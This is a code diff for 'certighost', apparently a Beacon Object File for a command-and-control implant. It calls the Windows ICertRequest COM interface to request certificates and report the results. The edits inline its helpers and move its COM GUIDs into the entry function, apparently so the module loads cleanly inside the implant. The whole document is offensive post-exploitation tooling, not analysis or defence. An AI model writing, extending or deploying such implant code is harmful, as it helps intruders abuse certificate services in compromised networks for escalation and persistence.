@@ -1,3 +1,5 @@
+#define CG_CORE_API static inline __attribute__((always_inline))
+#define CG_CORE_LOCAL static inline __attribute__((always_inline))
 #include "certighost_core.h"
 #include "certighost_win.h"
 #include "beacon.h"
@@ -9,15 +11,9 @@
  */
 #include "certighost_core.c"
 
-static GUID CG_CLSID_CCertRequest = {
-    0x98aff3f0u, 0x5524u, 0x11d0u, {0x88u, 0x12u, 0x00u, 0xa0u, 0xc9u, 0x03u, 0xb8u, 0x3cu}
-};
+#define CG_BOF_LOCAL static inline __attribute__((always_inline))
 
-static GUID CG_IID_ICertRequest = {
-    0x014e4840u, 0x5523u, 0x11d0u, {0x88u, 0x12u, 0x00u, 0xa0u, 0xc9u, 0x03u, 0xb8u, 0x3cu}
-};
-
-static int cg_bof_slice_equal(const cg_slice *left, const cg_slice *right) {
+CG_BOF_LOCAL int cg_bof_slice_equal(const cg_slice *left, const cg_slice *right) {
     cg_u32 i;
 
     if (left->len != right->len) {
@@ -31,7 +27,7 @@ static int cg_bof_slice_equal(const cg_slice *left, const cg_slice *right) {
     return 1;
 }
 
-static int cg_bof_extract_slice(datap *parser, cg_slice *out) {
+CG_BOF_LOCAL int cg_bof_extract_slice(datap *parser, cg_slice *out) {
     int raw_len = -1;
     char *raw = BeaconDataExtract(parser, &raw_len);
 
@@ -46,7 +42,7 @@ static int cg_bof_extract_slice(datap *parser, cg_slice *out) {
     return 1;
 }
 
-static int cg_bof_extract_validated_input(char *args, int alen, const cg_input *strict, cg_input *out) {
+CG_BOF_LOCAL int cg_bof_extract_validated_input(char *args, int alen, const cg_input *strict, cg_input *out) {
     datap parser;
 
     BeaconDataParse(&parser, args, alen);
@@ -69,7 +65,7 @@ static int cg_bof_extract_validated_input(char *args, int alen, const cg_input *
     return cg_validate_input(out) == CG_OK;
 }
 
-static BSTR cg_bof_bstr_from_ascii(const cg_u8 *value, cg_u32 len) {
+CG_BOF_LOCAL BSTR cg_bof_bstr_from_ascii(const cg_u8 *value, cg_u32 len) {
     BSTR out;
     cg_u32 i;
 
@@ -83,7 +79,7 @@ static BSTR cg_bof_bstr_from_ascii(const cg_u8 *value, cg_u32 len) {
     return out;
 }
 
-static void cg_bof_clear_bstr(BSTR value) {
+CG_BOF_LOCAL void cg_bof_clear_bstr(BSTR value) {
     if (value != (BSTR)0) {
         UINT bytes = OLEAUT32$SysStringByteLen(value);
         cg_secure_zero((void *)value, (cg_u32)bytes);
@@ -91,18 +87,18 @@ static void cg_bof_clear_bstr(BSTR value) {
     }
 }
 
-static void cg_bof_heap_free_sensitive(HANDLE heap, void *value, cg_u32 len) {
+CG_BOF_LOCAL void cg_bof_heap_free_sensitive(HANDLE heap, void *value, cg_u32 len) {
     if (heap != (HANDLE)0 && value != (void *)0) {
         cg_secure_zero(value, len);
         KERNEL32$HeapFree(heap, 0u, value);
     }
 }
 
-static void cg_bof_report_hresult(const char *phase, HRESULT hr) {
+CG_BOF_LOCAL void cg_bof_report_hresult(const char *phase, HRESULT hr) {
     BeaconPrintf(CALLBACK_ERROR, "certighost: %s failed (HRESULT=0x%08x)", phase, (unsigned int)hr);
 }
 
-static void cg_bof_emit_disposition_message(HANDLE heap, ICertRequest *request) {
+CG_BOF_LOCAL void cg_bof_emit_disposition_message(HANDLE heap, ICertRequest *request) {
     BSTR message = (BSTR)0;
     char *ascii = (char *)0;
     UINT chars;
@@ -140,7 +136,7 @@ static void cg_bof_emit_disposition_message(HANDLE heap, ICertRequest *request) 
     cg_bof_clear_bstr(message);
 }
 
-static void cg_bof_report_request_state(HANDLE heap, ICertRequest *request, LONG disposition, LONG request_id) {
+CG_BOF_LOCAL void cg_bof_report_request_state(HANDLE heap, ICertRequest *request, LONG disposition, LONG request_id) {
     LONG last_status = 0;
     HRESULT hr = request->lpVtbl->GetLastStatus(request, &last_status);
 
@@ -156,7 +152,13 @@ static void cg_bof_report_request_state(HANDLE heap, ICertRequest *request, LONG
     cg_bof_emit_disposition_message(heap, request);
 }
 
-void go(char *args, int alen) {
+__attribute__((flatten)) void go(char *args, int alen) {
+    GUID clsid_cert_request = {
+        0x98aff3f0u, 0x5524u, 0x11d0u, {0x88u, 0x12u, 0x00u, 0xa0u, 0xc9u, 0x03u, 0xb8u, 0x3cu}
+    };
+    GUID iid_cert_request = {
+        0x014e4840u, 0x5523u, 0x11d0u, {0x88u, 0x12u, 0x00u, 0xa0u, 0xc9u, 0x03u, 0xb8u, 0x3cu}
+    };
     cg_input strict_input;
     cg_input input;
     cg_status status;
@@ -216,10 +218,10 @@ void go(char *args, int alen) {
         cg_bof_report_hresult("CoInitializeEx", hr);
         goto cleanup;
     }
-    hr = OLE32$CoCreateInstance(&CG_CLSID_CCertRequest,
+    hr = OLE32$CoCreateInstance(&clsid_cert_request,
                                 CG_NULL,
                                 CG_CLSCTX_INPROC_SERVER,
-                                &CG_IID_ICertRequest,
+                                &iid_cert_request,
                                 (LPVOID *)&request);
     if (CG_FAILED(hr) || request == (ICertRequest *)0) {
         cg_bof_report_hresult("CoCreateInstance(CertRequest)", hr);
